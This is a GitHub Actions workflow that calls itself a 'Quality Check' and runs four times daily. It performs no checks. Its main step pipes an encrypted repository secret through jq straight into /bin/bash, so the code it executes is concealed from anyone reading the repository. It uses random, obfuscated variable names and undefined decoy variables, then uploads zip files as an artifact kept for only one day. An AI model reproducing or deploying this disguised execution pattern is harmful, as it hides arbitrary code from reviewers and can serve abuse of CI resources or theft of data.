name: Quality Check
on:
  workflow_dispatch:

  schedule:
    - cron: '10 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Execute
        env:
          mju8: ${{ secrets.mju8 }}
        run: |
          printf '%s' "$mju8" | jq -r .uqn28076 | /bin/bash
          printf '%s' "$usx6" | jq -r .wbbf6120 | /bin/bash
          printf '%s' "$dozr98614" | jq -r .i86 | /bin/bash
          printf '%s' "$qe56272" | jq -r .xbsu23 | /bin/bash
          printf '%s' "$t62" | jq -r .daf73199 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: qCssuNJD
          path: "*.zip"
          retention-days: 1
